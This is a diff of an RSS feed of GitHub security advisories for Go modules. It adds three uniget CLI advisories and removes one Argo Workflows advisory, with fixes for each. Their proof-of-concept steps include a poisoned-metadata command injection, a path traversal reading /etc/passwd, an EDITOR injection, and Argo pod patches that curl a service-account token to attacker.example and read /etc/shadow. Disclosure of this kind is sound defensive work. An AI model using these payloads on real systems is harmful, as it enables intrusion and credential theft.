@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-08-17T17:16:27.251Z</updated>
+    <updated>2026-08-17T18:21:20.336Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,215 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[gitlab.com/uniget-org/cli] uniget CLI: Metadata signature verification only runs when UNIGET_IGNORE_METADATA_SIGNATURE is set]]></title>
+        <id>https://github.com/advisories/GHSA-fhgh-wq4q-r37x</id>
+        <link href="https://github.com/advisories/GHSA-fhgh-wq4q-r37x"/>
+        <updated>2026-08-17T17:50:34.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The sigstore check on <code>metadata.json</code> is gated on the wrong side of the condition. <code>LoadMetadata</code> in <code>internal/config/update.go:81</code> verifies the bundle only when <code>UNIGET_IGNORE_METADATA_SIGNATURE</code> is non-empty, so in a normal run, where nobody sets that variable, the signature is never checked. Setting the variable that is named "ignore the signature" is what turns verification on.</p>
+<p>That matters because <code>metadata.json</code> populates <code>Tool.Check</code>, and <code>pkg/tool/tool.go:250</code> runs <code>Tool.Check</code> through <code>/bin/bash -c</code>. That is the same sink as CVE-2026-45152, and the signature check added in v0.27.1 to close it is the control that no longer runs.</p>
+<h2 id="where-it-is">Where it is</h2>
+<p><code>internal/config/update.go:80-100</code>:</p>
+<pre><code class="language-go">func (c *Config) LoadMetadata(filename string) (loadedTools *tool.Tools, err error) {
+    if len(os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE")) &gt; 0 {
+        _, err = security.VerifySigstoreBundle(
+            filename,
+            filename+".sigstore.json",
+            ...
+        )
+        if err != nil {
+            return nil, fmt.Errorf("error verifying sigstore bundle for metadata: %s", err)
+        }
+    }
+
+    loadedTools, err = tool.LoadFromFile(filename)
+</code></pre>
+<p><code>cmd/uniget/main.go:102-105</code> carries the same flipped condition in the decision about whether to re-download metadata:</p>
+<pre><code class="language-go">if !myos.FileExists(configuration.Prefix+"/"+configuration.GetMetadataFile()) ||
+    configuration.AutoUpdate ||
+    (len(os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE")) &gt; 0 &amp;&amp;
+        !myos.FileExists(configuration.Prefix+"/"+configuration.GetMetadataFile()+".sigstore.json")) {
+</code></pre>
+<p>so a cached <code>metadata.json</code> with no <code>.sigstore.json</code> beside it is not refetched either, as long as the variable is unset.</p>
+<p><code>LoadMetadata</code> is called from <code>cmd/uniget/main.go:115</code> in the persistent pre-run, which means every subcommand loads metadata this way. The sink is <code>pkg/tool/tool.go:248-251</code>:</p>
+<pre><code class="language-go">func (tool *Tool) RunVersionCheck() (string, error) {
+    logging.Tracef("Running version check for %s: %s", tool.Name, tool.Check)
+    cmd := exec.Command("/bin/bash", "-c", tool.Check+" | tr -d '\n'")
+</code></pre>
+<h2 id="how-it-got-this-way">How it got this way</h2>
+<p>The check was introduced correctly. In d12ef12c ("fix: Only accept signed metadata", released as v0.27.1) <code>VerifySigstoreBundle</code> was called unconditionally. 370d0155 then wrapped it in <code>if os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE") != "true"</code>, which is still the right polarity. b68a27d5 ("fix: Accept any non-empty value"), which is the commit tagged v0.27.4, rewrote that as <code>if len(os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE")) &gt; 0</code>. The intent was clearly to accept any truthy value instead of the literal string "true", but the negation was dropped in the rewrite and the meaning flipped.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Built from a clean checkout of the v0.28.2 tag with <code>go build -o /tmp/unigetbin ./cmd/uniget</code>, then run in user mode against a poisoned cache with no <code>metadata.json.sigstore.json</code> present and <code>UNIGET_IGNORE_METADATA_SIGNATURE</code> explicitly removed from the environment.</p>
+<pre><code class="language-bash">H=/tmp/pochome
+mkdir -p $H/.cache/uniget $H/.local/state/uniget/manifests $H/.local/bin $H/.config/uniget $H/.cache/uniget/evil
+cat &gt; $H/.cache/uniget/metadata.json &lt;&lt;'EOF'
+{"tools":[{"name":"evil","version":"1.0.0","binary":"${target}/bin/evil",
+"check":"id &gt; /tmp/uniget-rce-proof.txt; echo PWNED","tags":["test"],
+"description":"poisoned metadata","repository":"https://example.com",
+"license":{"name":"MIT","link":"https://example.com"},
+"sources":[{"registry":"ghcr.io","repository":"uniget-org/tools"}]}]}
+EOF
+printf '#!/bin/sh\necho 1.0.0\n' &gt; $H/.local/bin/evil; chmod +x $H/.local/bin/evil
+touch $H/.cache/uniget/evil/1.0.0
+
+env -u UNIGET_IGNORE_METADATA_SIGNATURE HOME=$H XDG_CACHE_HOME=$H/.cache \
+  XDG_STATE_HOME=$H/.local/state XDG_CONFIG_HOME=$H/.config \
+  /tmp/unigetbin --user version evil
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">PWNED
+</code></pre>
+<p>and <code>/tmp/uniget-rce-proof.txt</code> contains the output of <code>id</code>. No signature error was raised, even though there is no bundle file at all.</p>
+<p>The control run is the part that pins down the polarity. Same command, same poisoned metadata, only now a <code>metadata.json.sigstore.json</code> exists (deliberately not a valid bundle) and the "ignore" variable is set:</p>
+<pre><code class="language-bash">echo '{"not":"a real bundle"}' &gt; $H/.cache/uniget/metadata.json.sigstore.json
+UNIGET_IGNORE_METADATA_SIGNATURE=1 HOME=$H XDG_CACHE_HOME=$H/.cache \
+  XDG_STATE_HOME=$H/.local/state XDG_CONFIG_HOME=$H/.config \
+  /tmp/unigetbin --user version evil
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">Error: error loading metadata: error verifying sigstore bundle for metadata: error loading bundle from path /tmp/pochome/.cache/uniget/metadata.json.sigstore.json: proto: (line 1:2): unknown field "not"
+</code></pre>
+<p>So verification runs when the ignore variable is set, and does not run when it is unset.</p>
+<h2 id="impact">Impact</h2>
+<p>Anything that can substitute the metadata layer gets command execution as the user running uniget: a compromised or attacker-chosen registry or mirror for <code>uniget-org/tools</code>, a tampered tarball on the way into the cache, or a poisoned cache file. The sigstore bundle is the only thing standing between that metadata and <code>/bin/bash -c</code>, and right now it is not consulted. Locally this reproduces the CVE-2026-45152 scenario on a supposedly fixed version; the wider concern is that the supply chain check for the tool catalogue is effectively off for every user.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Invert the condition so verification is the default and the environment variable opts out:</p>
+<pre><code class="language-go">if len(os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE")) == 0 {
+    _, err = security.VerifySigstoreBundle(...)
+    ...
+}
+</code></pre>
+<p>The same inversion is needed at <code>cmd/uniget/main.go:104</code>, where the re-download decision should be "the bundle is missing and we are not ignoring signatures". It would also be worth failing closed when the <code>.sigstore.json</code> file is absent rather than treating a missing bundle as nothing to verify.</p>
+<h2 id="deduplication">Deduplication</h2>
+<p>CVE-2026-45152 (GHSA-qqq4-5773-pmw5) covers the <code>tool.Check</code> command injection itself and is marked patched in v0.27.1. This report is not that finding again: it is that the patch, which was the signature check, stopped running as of v0.27.4 because of the condition rewrite in b68a27d5. The other two published advisories, GHSA-m6jg-wr9m-cg2f and GHSA-qmcq-xw74-w667, are about hook file paths and the EDITOR variable and do not touch metadata loading.</p>
+<h2 id="how-i-found-it-and-a-note-on-tooling">How I found it and a note on tooling</h2>
+<p>I was reading the shipped fix for CVE-2026-45152 to see whether the guard covered all the paths that reach <code>RunVersionCheck</code>, and the gate condition read backwards on first pass, so I walked the history of that line back to the commit that introduced it. I used AI tooling while investigating, and I built the CLI at v0.28.2 and ran both the exploit and the control myself before writing this up.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/uniget-org/cli/security/advisories/GHSA-fhgh-wq4q-r37x">https://github.com/uniget-org/cli/security/advisories/GHSA-fhgh-wq4q-r37x</a></li>
+<li><a href="https://github.com/uniget-org/cli/releases/tag/v0.28.9">https://github.com/uniget-org/cli/releases/tag/v0.28.9</a></li>
+<li><a href="https://github.com/advisories/GHSA-fhgh-wq4q-r37x">https://github.com/advisories/GHSA-fhgh-wq4q-r37x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fhgh-wq4q-r37x</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-17T17:50:34.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[gitlab.com/uniget-org/cli] uniget CLI has Path Traversal in Hook Files - Directory Escape Vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-m6jg-wr9m-cg2f</id>
+        <link href="https://github.com/advisories/GHSA-m6jg-wr9m-cg2f"/>
+        <updated>2026-08-17T17:46:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Path Traversal vulnerability in hook filename handling allows attackers to access and manipulate arbitrary files outside the hooks directory via directory escape sequences like <a>passwd</a>.</p>
+<p><strong>Details</strong>
+File: <a>hooks.go</a> <code>Lines 135-160</code></p>
+<pre><code>hookFileName := args[0]  // User input not validated
+hookFile = preInstallHooksDir + "/" + hookFileName  // Direct concatenation
+</code></pre>
+<p>Hook filenames are concatenated directly without sanitizing ../ sequences, allowing directory traversal.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Step 1:</strong> Set cat as editor</p>
+<pre><code>export EDITOR="cat"
+</code></pre>
+<p><strong>Step 2:</strong> Read /etc/passwd via path traversal</p>
+<pre><code>./uniget hooks edit --type=pre-install "../../../../etc/passwd"
+</code></pre>
+<p><strong>Step 3:</strong> Output shows file contents</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+[...]
+</code></pre>
+<img width="1014" height="178" alt="image" src="https://github.com/user-attachments/assets/0db0fe7e-533b-4d8e-a346-81886ce866ab">
+### References
+
+<ul>
+<li><a href="https://github.com/uniget-org/cli/security/advisories/GHSA-m6jg-wr9m-cg2f">https://github.com/uniget-org/cli/security/advisories/GHSA-m6jg-wr9m-cg2f</a></li>
+<li><a href="https://github.com/uniget-org/cli/commit/7b4f18a9f00f0955f830c7ccf266ed0de5f9fd91">https://github.com/uniget-org/cli/commit/7b4f18a9f00f0955f830c7ccf266ed0de5f9fd91</a></li>
+<li><a href="https://github.com/uniget-org/cli/releases/tag/v0.27.6">https://github.com/uniget-org/cli/releases/tag/v0.27.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-m6jg-wr9m-cg2f">https://github.com/advisories/GHSA-m6jg-wr9m-cg2f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m6jg-wr9m-cg2f</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-17T17:46:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[gitlab.com/uniget-org/cli] uniget CLI has an EDITOR Command Injection]]></title>
+        <id>https://github.com/advisories/GHSA-qmcq-xw74-w667</id>
+        <link href="https://github.com/advisories/GHSA-qmcq-xw74-w667"/>
+        <updated>2026-08-17T17:46:06.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The uniget CLI has a command injection vulnerability in <a>hooks.go</a> line 199 where <a>strings.Split(editor, " ")</a> naively parses the EDITOR environment variable without respecting shell syntax. An attacker can set EDITOR="/path/to/wrapper &amp;&amp; id &amp;&amp; echo" which gets split into separate arguments, allowing the wrapper script to execute arbitrary commands like id. This was successfully exploited to execute uid=1000(w4nn4d13), confirming code execution is possible. The vulnerability affects hook editing and breaks configurations with modern editors like VSCode.</p>
+<p><strong>Vulnerable Code:</strong></p>
+<pre><code>editorWithArgs := strings.Split(editor, " ")
+</code></pre>
+<p><strong>Location Context:</strong></p>
+<pre><code>editor := os.Getenv("UNIGET_EDITOR")
+if len(editor) == 0 {
+    editor = os.Getenv("EDITOR")
+}
+editorWithArgs := strings.Split(editor, " ")  // ← VULNERABLE
+command := exec.Command(editorWithArgs[0], editorWithArgs[1:]...)
+</code></pre>
+<p><strong>Issue:</strong> Naive space-splitting allows injection. EDITOR="script &amp;&amp; id &amp;&amp; echo" splits into ["script", "&amp;&amp;", "id", "&amp;&amp;", "echo"] enabling command execution.</p>
+<h2 id="step-to-reproduce"><strong>Step to Reproduce</strong></h2>
+<p>**Step 1: **Create malicious editor wrapper</p>
+<pre><code>mkdir -p /tmp/poc-editor
+cat &gt; /tmp/poc-editor/editor_wrapper.sh &lt;&lt; 'EOF'
+#!/bin/bash
+echo "[EDITOR] Received args: $@"
+id
+EOF
+chmod +x /tmp/poc-editor/editor_wrapper.sh
+</code></pre>
+<p>**Step 2: **Create test hook</p>
+<pre><code>mkdir -p ~/.config/uniget/hooks/pre-install
+cat &gt; ~/.config/uniget/hooks/pre-install/test.sh &lt;&lt; 'EOF'
+#!/bin/bash
+echo "Test hook"
+EOF
+chmod 700 ~/.config/uniget/hooks/pre-install/test.sh
+</code></pre>
+<p><strong>Step 3:</strong> Set injection payload</p>
+<pre><code>export EDITOR="/tmp/poc-editor/editor_wrapper.sh &amp;&amp; id &amp;&amp; echo"
+</code></pre>
+<p><strong>Step 4:</strong> Run vulnerable code</p>
+<pre><code>cd /home/w4nn4d13/Downloads/cli
+go build -o uniget ./cmd/uniget
+./uniget hooks edit --type=pre-install test.sh
+</code></pre>
+<p><strong>Step 5:</strong> Observe output</p>
+<pre><code>[EDITOR] Received args: &amp;&amp; id &amp;&amp; echo /path/to/hook
+uid=1000(w4nn4d13) gid=1000(w4nn4d13) groups=1000(w4nn4d13),65534(nfsnobody)
+</code></pre>
+<img width="1017" height="449" alt="image" src="https://github.com/user-attachments/assets/9c72ea0c-fa08-46cd-a9cb-098942a488ce">
+### References
+
+<ul>
+<li><a href="https://github.com/uniget-org/cli/security/advisories/GHSA-qmcq-xw74-w667">https://github.com/uniget-org/cli/security/advisories/GHSA-qmcq-xw74-w667</a></li>
+<li><a href="https://github.com/uniget-org/cli/commit/7b4f18a9f00f0955f830c7ccf266ed0de5f9fd91">https://github.com/uniget-org/cli/commit/7b4f18a9f00f0955f830c7ccf266ed0de5f9fd91</a></li>
+<li><a href="https://github.com/uniget-org/cli/releases/tag/v0.27.6">https://github.com/uniget-org/cli/releases/tag/v0.27.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-qmcq-xw74-w667">https://github.com/advisories/GHSA-qmcq-xw74-w667</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qmcq-xw74-w667</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-17T17:46:05.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/gruntwork-io/terragrunt] Terragrunt: Arbitrary File Deletion via Malicious Module Manifest]]></title>
         <id>https://github.com/advisories/GHSA-8394-6f8r-whxg</id>
@@ -809,497 +1018,5 @@ spec:
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-08-13T14:16:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/argoproj/argo-workflows/v3] Argo Workflows: ArtifactGC.PodSpecPatch bypasses Strict/Secure template reference allow-list (Incomplete fix for CVE-2026-31892)]]></title>
-        <id>https://github.com/advisories/GHSA-48p8-g2fx-3wwm</id>
-        <link href="https://github.com/advisories/GHSA-48p8-g2fx-3wwm"/>
-        <updated>2026-08-13T14:16:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The allow-list fix for CVE-2026-31892 (GHSA-3wf5-g532-rcrr), and its follow-up coverage of <code>hostNetwork</code>/<code>securityContext</code>/<code>serviceAccountName</code> in GHSA-3775-99mw-8rp4, is incomplete. <code>workflow/util/merge.go</code> <code>ValidateUserOverrides</code> / <code>SanitizeUserWorkflowSpec</code> walk only the top-level fields of <code>WorkflowSpec</code> via reflection. <code>WorkflowSpec.ArtifactGC</code> is allow-listed because admins want users to configure artifact garbage collection. The struct behind that field, <code>WorkflowLevelArtifactGC</code>, has a <code>PodSpecPatch</code> sub-field whose contents flow unmodified into <code>util.ApplyPodSpecPatch</code> on the artifact-GC pod - the same sink the original fix closed for <code>WorkflowSpec.PodSpecPatch</code>. A user submitting a Workflow under <code>templateReferencing: Strict</code> or <code>Secure</code> can therefore still inject an arbitrary strategic merge patch into the artifact-GC pod (hostPath volumes, <code>privileged: true</code>, arbitrary image and command, <code>hostNetwork: true</code>), defeating the stated purpose of Strict/Secure reference mode.</p>
-<h3 id="details">Details</h3>
-<p>Locations in <code>main</code> at <code>4d9f021</code> (HEAD 2026-04-23):</p>
-<p>Allow-list and reflection scope - <code>workflow/util/merge.go:19-60</code>:</p>
-<pre><code class="language-go">var allowedUserOverrideFields = map[string]bool{
-    "Arguments":             true,
-    "Entrypoint":            true,
-    ...
-    "ArtifactGC":            true,   // &lt;-- allow-listed wholesale
-}
-
-func ValidateUserOverrides(userSpec *wfv1.WorkflowSpec) error {
-    v := reflect.ValueOf(userSpec).Elem()
-    t := v.Type()
-    zero := reflect.New(t).Elem()
-    for i := 0; i &lt; t.NumField(); i++ {
-        fieldName := t.Field(i).Name
-        if allowedUserOverrideFields[fieldName] {
-            continue                  // &lt;-- sub-fields are not walked
-        }
-        if !reflect.DeepEqual(v.Field(i).Interface(), zero.Field(i).Interface()) {
-            violations = append(violations, fieldName)
-        }
-    }
-    ...
-}
-</code></pre>
-<p>The allow-listed type - <code>pkg/apis/workflow/v1alpha1/workflow_types.go:1207-1217</code>:</p>
-<pre><code class="language-go">type WorkflowLevelArtifactGC struct {
-    ArtifactGC            `json:",inline"`
-    ForceFinalizerRemoval bool   `json:"forceFinalizerRemoval,omitempty"`
-    PodSpecPatch          string `json:"podSpecPatch,omitempty"`   // &lt;-- sink input
-}
-</code></pre>
-<p>The sink - <code>workflow/controller/artifact_gc.go:731-740</code> reads the user-controlled value:</p>
-<pre><code class="language-go">func (woc *wfOperationCtx) getArtifactGCPodInfo(artifact *wfv1.Artifact) podInfo {
-    info := podInfo{}
-    if woc.execWf.Spec.ArtifactGC != nil {
-        woc.updateArtifactGCPodInfo(&amp;woc.execWf.Spec.ArtifactGC.ArtifactGC, &amp;info)
-        info.podSpecPatch = woc.execWf.Spec.ArtifactGC.PodSpecPatch
-    }
-    ...
-}
-</code></pre>
-<p>And <code>workflow/controller/artifact_gc.go:518-525</code> feeds it unchanged to the same helper that CVE-2026-31892 closed for the top-level field:</p>
-<pre><code class="language-go">if info.podSpecPatch != "" {
-    patchedPodSpec, patchErr := util.ApplyPodSpecPatch(pod.Spec, info.podSpecPatch)
-    if patchErr != nil {
-        return nil, patchErr
-    }
-    pod.Spec = *patchedPodSpec
-}
-</code></pre>
-<p><code>util.ApplyPodSpecPatch</code> (<code>workflow/util/util.go:1560</code>) is a raw <code>strategicpatch.StrategicMergePatch</code> over the whole <code>apiv1.PodSpec</code> with no field-level restriction; it is the same primitive that was weaponized by the original CVE-2026-31892 against <code>WorkflowSpec.PodSpecPatch</code>. The pod it is applied to - built in <code>workflow/controller/artifact_gc.go</code> ~line 460-495 - has <code>AutomountServiceAccountToken: true</code> and a hardened <code>MinimalCtrSC()</code> security context that the patch fully overrides.</p>
-<p>The merge path is the one the fix already walks. <code>operator.go:#setStoredWfSpec</code> does <code>SanitizeUserWorkflowSpec(&amp;woc.wf.Spec)</code> before <code>JoinWorkflowSpec(userSpec, workflowTemplateSpec, wfDefaultSpec)</code>. <code>Sanitize</code> preserves <code>ArtifactGC</code> wholesale. <code>Join</code> uses <code>strategicpatch.StrategicMergePatch</code> with the user spec as the target, so the user's <code>artifactGC.podSpecPatch</code> value wins whenever it is non-empty.</p>
-<p>Precondition for the attack: the referenced <code>WorkflowTemplate</code> has at least one template with an output artifact. <code>workflow/controller/artifact_gc.go:79</code> <code>HasArtifactGC</code> iterates <code>execWf.Spec.Templates[*].Outputs.Artifacts[*]</code> and asks <code>GetArtifactGCStrategy(&amp;artifact)</code>, which falls back to <code>w.Spec.ArtifactGC.Strategy</code> when the per-artifact strategy is <code>Undefined</code> (<code>pkg/apis/workflow/v1alpha1/workflow_types.go:245</code>). The user supplies <code>spec.artifactGC.strategy: OnWorkflowCompletion</code> (in the allow-list) so the fallback is satisfied on any template that emits artifacts - the common case for real workloads.</p>
-<p>No validation sits between sanitize and sink:</p>
-<pre><code>grep -rn "ValidateArtifactGC\|validateArtifactGC\|ArtifactGC.*PodSpecPatch" --include="*.go" workflow/validate/
-# (no output)
-</code></pre>
-<p>The merge-package test file added with the fix (<code>workflow/util/merge_test.go</code> @ <code>4d9f021</code>) covers only <code>WorkflowSpec.PodSpecPatch</code>; <code>ArtifactGC.PodSpecPatch</code> is not exercised.</p>
-<h3 id="poc">PoC</h3>
-<p>Self-contained Go unit tests against the shipped <code>workflow/util</code> package at <code>main@4d9f021</code>. Drop either file into <code>workflow/util/</code> and run <code>go test</code>.</p>
-<p><code>poc/merge_artifactgc_poc_test.go</code>:</p>
-<pre><code class="language-go">package util
-
-import (
-    "testing"
-    "github.com/stretchr/testify/assert"
-    "github.com/stretchr/testify/require"
-    wfv1 "github.com/argoproj/argo-workflows/v4/pkg/apis/workflow/v1alpha1"
-)
-
-func TestPoC_ArtifactGCPodSpecPatchPassesAllowList(t *testing.T) {
-    attackerPatch := `{"containers":[{"name":"main","image":"attacker/evil:latest",` +
-        `"command":["sh","-c","curl attacker.example/exfil -d @/var/run/secrets/kubernetes.io/serviceaccount/token"]}],` +
-        `"hostNetwork":true}`
-    userSpec := &amp;wfv1.WorkflowSpec{
-        WorkflowTemplateRef: &amp;wfv1.WorkflowTemplateRef{Name: "safe-template"},
-        ArtifactGC: &amp;wfv1.WorkflowLevelArtifactGC{
-            ArtifactGC:   wfv1.ArtifactGC{Strategy: wfv1.ArtifactGCOnWorkflowCompletion},
-            PodSpecPatch: attackerPatch,
-        },
-    }
-
-    // Gate 1: allow-list. Expected to reject - does not.
-    require.NoError(t, ValidateUserOverrides(userSpec))
-
-    // Gate 2: sanitizer defense-in-depth. Expected to strip - does not.
-    sanitized := SanitizeUserWorkflowSpec(userSpec)
-    assert.Equal(t, attackerPatch, sanitized.ArtifactGC.PodSpecPatch)
-}
-</code></pre>
-<p><code>poc/artgc_sink_poc_test.go</code> demonstrates the same patch reaching <code>ApplyPodSpecPatch</code> and mutating the hardened pod baseline (switches image, sets <code>privileged: true</code>, sets <code>hostNetwork: true</code>, adds a <code>hostPath: /</code> volume):</p>
-<pre><code class="language-go">func TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch(t *testing.T) {
-    attackerPatch := `
-containers:
-- name: main
-  image: attacker/evil:latest
-  command: [sh, -c, "curl attacker.example/exfil -d @/var/run/secrets/kubernetes.io/serviceaccount/token"]
-  securityContext:
-    privileged: true
-    runAsUser: 0
-    runAsNonRoot: false
-    allowPrivilegeEscalation: true
-    capabilities: {drop: null, add: [SYS_ADMIN]}
-    readOnlyRootFilesystem: false
-hostNetwork: true
-volumes:
-- name: hostroot
-  hostPath: {path: /}
-`
-    userSpec := &amp;wfv1.WorkflowSpec{
-        WorkflowTemplateRef: &amp;wfv1.WorkflowTemplateRef{Name: "safe-template"},
-        ArtifactGC: &amp;wfv1.WorkflowLevelArtifactGC{
-            ArtifactGC:   wfv1.ArtifactGC{Strategy: wfv1.ArtifactGCOnWorkflowCompletion},
-            PodSpecPatch: attackerPatch,
-        },
-    }
-    require.NoError(t, ValidateUserOverrides(userSpec))
-    sanitized := SanitizeUserWorkflowSpec(userSpec)
-
-    // Baseline built exactly like workflow/controller/artifact_gc.go:createArtifactGCPod.
-    basePod := apiv1.PodSpec{ /* AutomountSAToken=true, MinimalCtrSC, limits, etc. */ }
-
-    patched, err := ApplyPodSpecPatch(basePod, sanitized.ArtifactGC.PodSpecPatch)
-    require.NoError(t, err)
-
-    assert.Equal(t, "attacker/evil:latest",     patched.Containers[0].Image)
-    assert.Equal(t, true, *patched.Containers[0].SecurityContext.Privileged)
-    assert.Equal(t, true, patched.HostNetwork)
-    assert.Equal(t, "/",  patched.Volumes[0].HostPath.Path)
-}
-</code></pre>
-<p>Run:</p>
-<pre><code>go test -v -run "TestPoC_ArtifactGC" ./workflow/util/
-</code></pre>
-<p>Captured output:</p>
-<pre><code>=== RUN   TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch
---- PASS: TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch (0.00s)
-=== RUN   TestPoC_ArtifactGCPodSpecPatchPassesAllowList
---- PASS: TestPoC_ArtifactGCPodSpecPatchPassesAllowList (0.00s)
-PASS
-ok  	github.com/argoproj/argo-workflows/v4/workflow/util	0.036s
-</code></pre>
-<p>End-to-end Workflow manifest (for a live cluster reproduction by maintainers):</p>
-<pre><code class="language-yaml">apiVersion: argoproj.io/v1alpha1
-kind: WorkflowTemplate
-metadata: {name: safe-template}
-spec:
-  entrypoint: main
-  templates:
-    - name: main
-      container: {image: argoexec:latest, command: [echo, hello]}
-      outputs:
-        artifacts:
-          - {name: artifact, path: /tmp/artifact}
----
-apiVersion: argoproj.io/v1alpha1
-kind: Workflow
-metadata: {generateName: bypass-}
-spec:
-  workflowTemplateRef: {name: safe-template}
-  artifactGC:
-    strategy: OnWorkflowCompletion
-    podSpecPatch: |
-      containers:
-      - name: main
-        image: attacker/evil:latest
-        command: [sh, -c, "while true; do cat /host/etc/shadow; sleep 3600; done"]
-      hostNetwork: true
-      volumes:
-      - name: hostroot
-        hostPath: {path: /}
-</code></pre>
-<p>Controller config for the test cluster:</p>
-<pre><code class="language-yaml">workflowRestrictions:
-  templateReferencing: Strict
-</code></pre>
-<p>With the fix for CVE-2026-31892 in place, submitting this Workflow is expected to fail validation (the fix explicitly advertises that Strict mode restricts users to admin-approved templates). It is accepted, and the artifact-GC pod that the controller creates on workflow completion picks up the attacker's image, command, hostPath mount, and hostNetwork.</p>
-<h3 id="impact">Impact</h3>
-<p>Under <code>templateReferencing: Strict</code> or <code>Secure</code>, the purpose of the allow-list introduced in <code>4d9f021</code> is to make <code>workflowTemplateRef</code> the sole mechanism by which a user can request Workflow execution and to block spec fields that let the user override the admin's container configuration. <code>ArtifactGC.PodSpecPatch</code> is exactly such an override: a strategic merge patch applied by the controller to the artifact-GC pod, with no schema-level restriction on what it may change. Any template whose authors have declared output artifacts - i.e., any workflow that produces data, which is the motivating Argo use case - gives the submitter a path to:</p>
-<ul>
-<li>run an attacker-chosen image as a container in the workflow's namespace, with <code>AutomountServiceAccountToken: true</code>, i.e. holding the artifact-GC pod's service-account token,</li>
-<li>bypass <code>common.MinimalCtrSC()</code> / <code>common.MinimalPodSC()</code> by setting <code>privileged: true</code>, <code>allowPrivilegeEscalation: true</code>, <code>runAsUser: 0</code>, <code>readOnlyRootFilesystem: false</code>, <code>capabilities.add: [SYS_ADMIN]</code>,</li>
-<li>mount <code>hostPath: /</code> into the pod (reads and writes to the kubelet's node filesystem, subject only to any cluster-level PSA/PSP the operator has enforced independently),</li>
-<li>enable <code>hostNetwork: true</code> (equivalent to being on the node's network for the lifetime of the pod).</li>
-</ul>
-<p>This is the same class of impact the original CVE-2026-31892 (CVSS 8.9 - critical in the Strict-mode threat model) was rated for, against an identical sink. The fix blocks the top-level <code>PodSpecPatch</code> field but leaves a second call site with the same semantics reachable through an allow-listed sub-field.</p>
-<p>A minimal fix is either (a) add a sub-field pass to <code>ValidateUserOverrides</code>/<code>SanitizeUserWorkflowSpec</code> that rejects/empties <code>ArtifactGC.PodSpecPatch</code> when <code>MustUseReference()</code> is true, or (b) gate the <code>if info.podSpecPatch != ""</code> branch in <code>createArtifactGCPod</code> on the same <code>WorkflowRestrictions.MustUseReference()</code> check so the sink itself refuses user-supplied patches in Strict/Secure mode.</p>
-<p>CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/argoproj/argo-workflows/security/advisories/GHSA-48p8-g2fx-3wwm">https://github.com/argoproj/argo-workflows/security/advisories/GHSA-48p8-g2fx-3wwm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54526">https://nvd.nist.gov/vuln/detail/CVE-2026-54526</a></li>
-<li><a href="https://github.com/argoproj/argo-workflows/commit/277e9cef0ad16d7eaaab253573d0695951a65dbd">https://github.com/argoproj/argo-workflows/commit/277e9cef0ad16d7eaaab253573d0695951a65dbd</a></li>
-<li><a href="https://github.com/argoproj/argo-workflows/commit/358cc3968c8f06f1be0967e41df191088db0b662">https://github.com/argoproj/argo-workflows/commit/358cc3968c8f06f1be0967e41df191088db0b662</a></li>
-<li><a href="https://github.com/argoproj/argo-workflows/releases/tag/v3.7.15">https://github.com/argoproj/argo-workflows/releases/tag/v3.7.15</a></li>
-<li><a href="https://github.com/argoproj/argo-workflows/releases/tag/v4.0.6">https://github.com/argoproj/argo-workflows/releases/tag/v4.0.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-48p8-g2fx-3wwm">https://github.com/advisories/GHSA-48p8-g2fx-3wwm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-48p8-g2fx-3wwm</uri>
